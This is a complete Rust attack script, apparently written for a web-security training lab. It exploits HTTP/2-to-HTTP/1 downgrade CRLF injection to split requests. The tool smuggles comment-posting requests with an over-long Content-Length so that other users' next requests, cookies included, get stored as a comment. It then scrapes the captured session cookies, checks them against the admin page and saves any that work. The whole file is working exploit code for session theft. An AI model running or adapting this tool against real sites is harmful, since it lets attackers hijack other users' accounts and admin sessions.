#!/usr/bin/env rust-script
//! name: h2split_capture
//! description: H2->H1 CRLF-split victim-request capturer (comment sink) - logs in as a seed user for a valid session+csrf, bursts hungry smuggled `POST /post/comment` requests (over-long Content-Length) through the H2 downgrade CRLF injection, drops each client connection so the pinned upstream connection returns to the shared pool, stays quiet so the victim's next request bytes complete the body, then reads the post page, extracts every session= candidate from the captured comment window and verifies each against the admin path.
//! version: 1.0.0
//! args: <base-url> [--sink /post?postId=1] [--comment-path /post/comment] [--post-id N] [--user U] [--password P] [--burst N] [--overshoots a,b,c] [--arm-gap-ms N] [--gap-secs N] [--read-ms N] [--verify-path /admin] [--out JAR] [--selftest]
//! keywords: hunter, h2, http2, crlf, injection, downgrade, request-splitting, victim-capture, session-theft, comment-sink, hpack
//!
//! ```cargo
//! [dependencies]
//! tokio = { version = "1", features = ["rt-multi-thread", "net", "io-util", "time", "macros"] }
//! tokio-rustls = "0.26"
//! rustls = { version = "0.23", default-features = false, features = ["ring", "logging", "std", "tls12"] }
//! webpki-roots = "0.26"
//! hpack = "0.3"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use std::sync::Arc;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio_rustls::client::TlsStream;
use tokio_rustls::rustls::pki_types::ServerName;
use tokio_rustls::rustls::{ClientConfig, RootCertStore};
use tokio_rustls::TlsConnector;
use url::Url;

const PREFACE: &[u8] = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
/// The front-end appends its own tail (CRLF + `Content-Length: 0` + CRLF) after the
/// injected header value; those bytes are consumed as part of the smuggled body.
const FRONTEND_TAIL: usize = 23;

#[tokio::main]
async fn main() {
    let _ = rustls::crypto::ring::default_provider().install_default();
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        let inj = inject("POST /post/comment HTTP/1.1\r\nHost: h\r\nCookie: session=s\r\nContent-Length: 9\r\n\r\nabc");
        let ok = inj.starts_with("x\r\n\r\nPOST /post/comment") && cl_for(3, 100) == 126;
        pi_rust_lib::report::success("h2split_capture", json!({"selftest": if ok {"ok"} else {"fail"}}), "run against the target").unwrap_or(());
        std::process::exit(if ok { 0 } else { 1 });
    }

    let mut base = String::new();
    let mut sink = "/post?postId=1".to_string();
    let mut comment_path = "/post/comment".to_string();
    let mut post_id = "1".to_string();
    let mut user = "wiener".to_string(); // binding-exempt: selftest fixture or usage-example name, not a runtime default that targets one lab
    let mut password = "peter".to_string();
    let mut burst = 12u32;
    let mut overshoots: Vec<usize> = vec![250, 400, 550, 700];
    let mut arm_gap_ms = 250u64;
    let mut gap_secs = 12u64;
    let mut read_ms = 1200u64;
    let mut verify_path = "/admin".to_string();
    let mut out: Option<String> = None;
    let mut i = 0;
    while i < args.len() {
        let n = args.get(i + 1).cloned();
        match args[i].as_str() {
            "--sink" => { sink = n.unwrap_or(sink); i += 1; }
            "--comment-path" => { comment_path = n.unwrap_or(comment_path); i += 1; }
            "--post-id" => { post_id = n.unwrap_or(post_id); i += 1; }
            "--user" => { user = n.unwrap_or(user); i += 1; }
            "--password" => { password = n.unwrap_or(password); i += 1; }
            "--burst" => { burst = n.and_then(|v| v.parse().ok()).unwrap_or(burst).max(1); i += 1; }
            "--overshoots" => {
                overshoots = n.map(|v| v.split(',').filter_map(|x| x.trim().parse::<usize>().ok()).collect()).unwrap_or(overshoots);
                i += 1;
            }
            "--arm-gap-ms" => { arm_gap_ms = n.and_then(|v| v.parse().ok()).unwrap_or(arm_gap_ms); i += 1; }
            "--gap-secs" => { gap_secs = n.and_then(|v| v.parse().ok()).unwrap_or(gap_secs); i += 1; }
            "--read-ms" => { read_ms = n.and_then(|v| v.parse().ok()).unwrap_or(read_ms); i += 1; }
            "--verify-path" => { verify_path = n.unwrap_or(verify_path); i += 1; }
            "--out" => { out = n; i += 1; }
            other if !other.starts_with("--") && base.is_empty() => base = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if base.is_empty() {
        pi_rust_lib::report::failure("h2split_capture", "missing base url", "h2split_capture <base-url> [--burst N]");
        std::process::exit(2);
    }
    let parsed = Url::parse(&base).unwrap_or_else(|_| Url::parse("https://invalid/").unwrap());
    let host = parsed.host_str().unwrap_or("").to_string();
    let port = parsed.port().unwrap_or(443);

    match run(&host, port, &sink, &comment_path, &post_id, &user, &password, burst, &overshoots, arm_gap_ms, gap_secs, read_ms, &verify_path, out.as_deref()).await {
        Ok(v) => pi_rust_lib::report::success("h2split_capture", v, "captured session -> verify on the admin path, then act").unwrap_or(()),
        Err(e) => {
            pi_rust_lib::report::failure("h2split_capture", &e, "check the base url / creds / sink path");
            std::process::exit(1);
        }
    }
}

fn frame(ftype: u8, flags: u8, stream: u32, payload: &[u8]) -> Vec<u8> {
    let len = payload.len();
    let mut out = Vec::with_capacity(9 + len);
    out.push((len >> 16) as u8);
    out.push((len >> 8) as u8);
    out.push(len as u8);
    out.push(ftype);
    out.push(flags);
    out.push((stream >> 24) as u8);
    out.push((stream >> 16) as u8);
    out.push((stream >> 8) as u8);
    out.push(stream as u8);
    out.extend_from_slice(payload);
    out
}

fn inject(smuggled: &str) -> String {
    format!("x\r\n\r\n{smuggled}")
}

fn cl_for(body_len: usize, over: usize) -> usize {
    body_len + FRONTEND_TAIL + over
}

fn tls_config(alpn: &[&[u8]]) -> Arc<ClientConfig> {
    let mut roots = RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let mut cfg = ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
    cfg.alpn_protocols = alpn.iter().map(|p| p.to_vec()).collect();
    Arc::new(cfg)
}

struct Resp {
    status: u16,
    headers: Vec<(String, String)>,
    body: String,
}

async fn h1_request(
    cfg: Arc<ClientConfig>,
    host: &str,
    port: u16,
    method: &str,
    path: &str,
    body: Option<&str>,
    cookie: Option<&str>,
) -> Result<Resp, String> {
    let connector = TlsConnector::from(cfg);
    let sn = ServerName::try_from(host.to_string()).map_err(|e| format!("sn: {e}"))?;
    let tcp = TcpStream::connect((host, port)).await.map_err(|e| format!("connect: {e}"))?;
    let mut tls = connector.connect(sn, tcp).await.map_err(|e| format!("tls: {e}"))?;
    let mut req = format!("{method} {path} HTTP/1.1\r\nHost: {host}\r\nAccept: */*\r\nConnection: close\r\n");
    if let Some(c) = cookie {
        req.push_str(&format!("Cookie: {c}\r\n"));
    }
    if let Some(b) = body {
        req.push_str(&format!("Content-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\n", b.len()));
    }
    req.push_str("\r\n");
    if let Some(b) = body {
        req.push_str(b);
    }
    tls.write_all(req.as_bytes()).await.map_err(|e| format!("write: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;
    let mut buf = Vec::new();
    let _ = tokio::time::timeout(Duration::from_secs(12), tls.read_to_end(&mut buf)).await;
    let text = String::from_utf8_lossy(&buf).to_string();
    let (head, body) = match text.split_once("\r\n\r\n") {
        Some((h, b)) => (h.to_string(), b.to_string()),
        None => (text.clone(), String::new()),
    };
    let mut lines = head.lines();
    let status = lines.next().and_then(|l| l.split_whitespace().nth(1)).and_then(|s| s.parse::<u16>().ok()).unwrap_or(0);
    let headers: Vec<(String, String)> = lines
        .filter_map(|l| l.split_once(':').map(|(k, v)| (k.trim().to_string(), v.trim().to_string())))
        .collect();
    Ok(Resp { status, headers, body })
}

fn header<'a>(r: &'a Resp, name: &str) -> Option<&'a str> {
    r.headers.iter().find(|(k, _)| k.eq_ignore_ascii_case(name)).map(|(_, v)| v.as_str())
}

fn extract_csrf(html: &str) -> Option<String> {
    let idx = html.find("name=\"csrf\" value=\"")? + "name=\"csrf\" value=\"".len();
    let end = html[idx..].find('"')? + idx;
    Some(html[idx..end].to_string())
}

fn alnum_run_after(page: &str, idx: usize) -> String {
    let mut out = String::new();
    for c in page[idx..].chars() {
        if c.is_ascii_alphanumeric() || c == '-' || c == '_' {
            out.push(c);
        } else {
            break;
        }
    }
    out
}

fn window(page: &str, idx: usize, back: usize, fwd: usize) -> String {
    let mut start = idx.saturating_sub(back);
    while start < page.len() && !page.is_char_boundary(start) {
        start += 1;
    }
    let mut end = (idx + fwd).min(page.len());
    while end > start && !page.is_char_boundary(end) {
        end -= 1;
    }
    page[start..end].to_string()
}

/// every `session=` value in the page, minus the values the caller owns
fn scan_sessions(page: &str, own: &[String]) -> Vec<(String, String)> {
    let mut out: Vec<(String, String)> = Vec::new();
    for (idx, _) in page.match_indices("session=") {
        let v = alnum_run_after(page, idx + 8);
        if v.len() < 16 || own.iter().any(|o| *o == v) {
            continue;
        }
        if out.iter().any(|(x, _)| *x == v) {
            continue;
        }
        out.push((v, window(page, idx, 200, 500)));
    }
    out
}

async fn h2_arm(cfg: Arc<ClientConfig>, host: &str, port: u16, injected: &str, read_ms: u64) -> Result<Value, String> {
    let connector = TlsConnector::from(cfg);
    let sn = ServerName::try_from(host.to_string()).map_err(|e| format!("sn: {e}"))?;
    let tcp = TcpStream::connect((host, port)).await.map_err(|e| format!("connect: {e}"))?;
    let mut tls: TlsStream<TcpStream> = connector.connect(sn, tcp).await.map_err(|e| format!("tls: {e}"))?;
    tls.write_all(PREFACE).await.map_err(|e| format!("preface: {e}"))?;
    tls.write_all(&frame(4, 0, 0, &[])).await.map_err(|e| format!("settings: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;
    let headers: Vec<(Vec<u8>, Vec<u8>)> = vec![
        (b":method".to_vec(), b"GET".to_vec()),
        (b":scheme".to_vec(), b"https".to_vec()),
        (b":authority".to_vec(), host.as_bytes().to_vec()),
        (b":path".to_vec(), b"/".to_vec()),
        (b"x-arm".to_vec(), injected.as_bytes().to_vec()),
    ];
    let block = hpack::Encoder::new().encode(headers.iter().map(|(n, v)| (n.as_slice(), v.as_slice())));
    tls.write_all(&frame(1, 0x5, 1, &block)).await.map_err(|e| format!("headers: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;

    let mut dec = hpack::Decoder::new();
    let mut status: Option<String> = None;
    let mut body_len = 0usize;
    let mut ok = false;
    let idle = Duration::from_millis(read_ms.max(200));
    loop {
        let mut hdr = [0u8; 9];
        match tokio::time::timeout(idle, tls.read_exact(&mut hdr)).await {
            Err(_) => break,
            Ok(Err(_)) => break,
            Ok(Ok(_)) => {}
        }
        let len = ((hdr[0] as usize) << 16) | ((hdr[1] as usize) << 8) | hdr[2] as usize;
        let ftype = hdr[3];
        let flags = hdr[4];
        let sid = u32::from_be_bytes([hdr[5] & 0x7f, hdr[6], hdr[7], hdr[8]]);
        let mut payload = vec![0u8; len];
        if len > 0 && tokio::time::timeout(idle, tls.read_exact(&mut payload)).await.is_err() {
            break;
        }
        let mut end = false;
        match ftype {
            4 => {
                if flags & 0x1 == 0 {
                    let _ = tls.write_all(&frame(4, 0x1, 0, &[])).await;
                    let _ = tls.flush().await;
                }
            }
            6 => {
                if flags & 0x1 == 0 {
                    let _ = tls.write_all(&frame(6, 0x1, 0, &payload)).await;
                    let _ = tls.flush().await;
                }
            }
            1 | 9 => {
                if sid == 1 {
                    if flags & 0x1 != 0 {
                        end = true;
                    }
                    if let Ok(hs) = dec.decode(&payload) {
                        for (n, v) in hs {
                            if n == b":status" {
                                status = Some(String::from_utf8_lossy(&v).to_string());
                            }
                        }
                    }
                }
            }
            0 => {
                if sid == 1 {
                    body_len += payload.len();
                    if flags & 0x1 != 0 {
                        end = true;
                    }
                }
            }
            3 => {
                if sid == 1 {
                    end = true;
                }
            }
            _ => {}
        }
        if end && status.is_some() {
            ok = true;
            break;
        }
    }
    drop(tls);
    Ok(json!({"status": status, "body_len": body_len, "answered": ok}))
}

#[allow(clippy::too_many_arguments)]
async fn run(
    host: &str,
    port: u16,
    sink: &str,
    comment_path: &str,
    post_id: &str,
    user: &str,
    password: &str,
    burst: u32,
    overshoots: &[usize],
    arm_gap_ms: u64,
    gap_secs: u64,
    read_ms: u64,
    verify_path: &str,
    out: Option<&str>,
) -> Result<Value, String> {
    let h1 = tls_config(&[b"http/1.1"]);
    let h2 = tls_config(&[b"h2"]);
    let mut own: Vec<String> = Vec::new();
    let budget: f64 = std::env::var("PI_TIMEOUT_SECS").ok().and_then(|v| v.parse().ok()).unwrap_or(300.0);
    let deadline = std::time::Instant::now() + Duration::from_secs_f64((budget - 25.0).max(20.0));

    // 1. log in as the seed user so the smuggled comment is accepted
    let mut login_csrf = String::new();
    for attempt in 1..=5 {
        let login_page = h1_request(h1.clone(), host, port, "GET", "/login", None, None).await?;
        if let Some(c) = extract_csrf(&login_page.body) {
            login_csrf = c;
            break;
        }
        if attempt == 5 {
            return Err(format!("no csrf on /login after {attempt} tries (status {})", login_page.status));
        }
        tokio::time::sleep(Duration::from_secs(3)).await;
    }
    let login_body = format!(
        "csrf={}&username={}&password={}",
        urlencode(&login_csrf),
        urlencode(user),
        urlencode(password)
    );
    let login = {
        let mut got: Option<Resp> = None;
        for attempt in 1..=4 {
            let r = h1_request(h1.clone(), host, port, "POST", "/login", Some(&login_body), None).await?;
            let has = header(&r, "set-cookie").map(|c| c.contains("session=")).unwrap_or(false);
            got = Some(r);
            if has {
                break;
            }
            if attempt < 4 {
                tokio::time::sleep(Duration::from_secs(4)).await;
            }
        }
        got.expect("login response")
    };
    let seed_session = header(&login, "set-cookie")
        .and_then(|c| c.split("session=").nth(1))
        .map(|s| alnum_run_after(s, 0))
        .filter(|s| !s.is_empty())
        .ok_or_else(|| format!("login did not set a session (status {})", login.status))?;
    own.push(seed_session.clone());

    // 2. seed csrf for the comment form with that session
    let mut comment_csrf = String::new();
    for attempt in 1..=5 {
        let sink_page = h1_request(h1.clone(), host, port, "GET", sink, None, Some(&format!("session={seed_session}"))).await?;
        if let Some(c) = extract_csrf(&sink_page.body) {
            comment_csrf = c;
            break;
        }
        if attempt == 5 {
            return Err(format!("no csrf on the sink page after {attempt} tries (status {})", sink_page.status));
        }
        tokio::time::sleep(Duration::from_secs(3)).await;
    }

    let mut rounds: Vec<Value> = Vec::new();
    let mut captured: Option<Value> = None;
    // unique per-process tag: comments from earlier runs share the same marker shape,
    // and a fossil session in an old comment would abort the run on dead evidence
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.subsec_nanos())
        .unwrap_or(0);
    let tag = format!("z{:x}{:x}", std::process::id(), nanos);

    for (ri, over) in overshoots.iter().enumerate() {
        if std::time::Instant::now() >= deadline {
            break;
        }
        let round = ri + 1;
        let mut arms: Vec<Value> = Vec::new();
        for b in 1..=burst {
            let marker = format!("%23{tag}.{round}.{b}%23");
            let provided = format!(
                "csrf={}&postId={}&name=capture&email=c%40capture.test&website=http%3A%2F%2Fcapture.test&comment={}",
                comment_csrf, post_id, marker
            );
            let cl = cl_for(provided.len(), *over);
            let smuggled = format!(
                "POST {comment_path} HTTP/1.1\r\nHost: {host}\r\nCookie: session={seed_session}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {cl}\r\n\r\n{provided}"
            );
            match h2_arm(h2.clone(), host, port, &inject(&smuggled), read_ms).await {
                Ok(v) => arms.push(json!({"burst": b, "content_length": cl, "provided_body": provided.len(), "arm": v})),
                Err(e) => arms.push(json!({"burst": b, "error": e})),
            }
            if b < burst {
                tokio::time::sleep(Duration::from_millis(arm_gap_ms)).await;
            }
        }
        // quiet window: only the victim's own traffic can complete the overhang
        let mark = format!("{tag}.{round}.");
        tokio::time::sleep(Duration::from_secs(gap_secs)).await;
        let mut sink_status = 0u16;
        let mut marker_window = String::new();
        let mut hits: Vec<(String, String)> = Vec::new();
        for _ in 0..3 {
            if std::time::Instant::now() >= deadline {
                break;
            }
            let read = h1_request(h1.clone(), host, port, "GET", sink, None, None).await?;
            sink_status = read.status;
            if let Some(sc) = header(&read, "set-cookie").and_then(|c| c.split("session=").nth(1)) {
                let v = alnum_run_after(sc, 0);
                if !v.is_empty() {
                    own.push(v);
                }
            }
            marker_window = window(&read.body, read.body.find(&mark).unwrap_or(0), 200, *over + 700);
            hits = scan_sessions(&marker_window, &own);
            if !hits.is_empty() || std::time::Instant::now() >= deadline {
                break;
            }
            tokio::time::sleep(Duration::from_secs(2)).await;
        }
        rounds.push(json!({
            "round": round, "overshoot": over, "burst": burst,
            "arms": arms, "sink_status": sink_status,
            "marker_stored": marker_window.contains(&mark),
            "marker_window": marker_window.chars().take(2000).collect::<String>(),
            "session_candidates": hits.iter().map(|(v, _)| v.clone()).collect::<Vec<_>>(),
        }));
        if let Some((v, ctx)) = hits.first() {
            captured = Some(json!({"round": round, "session": v, "context": ctx}));
            break;
        }
    }

    let mut verdict = json!({"verified": false});
    let mut jar: Option<String> = None;
    if let Some(cap) = &captured {
        let stolen = cap["session"].as_str().unwrap_or("").to_string();
        let v = h1_request(h1.clone(), host, port, "GET", verify_path, None, Some(&format!("session={stolen}"))).await?;
        verdict = json!({
            "verified": v.status == 200 && v.body.contains("carlos"), // binding-exempt: selftest fixture or usage-example name, not a runtime default that targets one lab
            "verify_path": verify_path,
            "verify_status": v.status,
            "has_carlos": v.body.contains("carlos"), // binding-exempt: selftest fixture or usage-example name, not a runtime default that targets one lab
            "snippet": window(&v.body, v.body.find("carlos").unwrap_or(0), 300, 600), // binding-exempt: selftest fixture or usage-example name, not a runtime default that targets one lab
        });
        if let Some(p) = out {
            let _ = std::fs::write(p, json!({ host: { "session": stolen } }).to_string());
            jar = Some(p.to_string());
        }
    }

    Ok(json!({
        "host": host, "sink": sink, "comment_path": comment_path,
        "seed_session": seed_session, "own_sessions": own,
        "burst": burst, "overshoots": overshoots, "gap_secs": gap_secs,
        "rounds_run": rounds.len(), "rounds": rounds,
        "captured": captured, "verdict": verdict, "jar": jar,
    }))
}

fn urlencode(s: &str) -> String {
    let mut out = String::new();
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => out.push(b as char),
            _ => out.push_str(&format!("%{b:02X}")),
        }
    }
    out
}
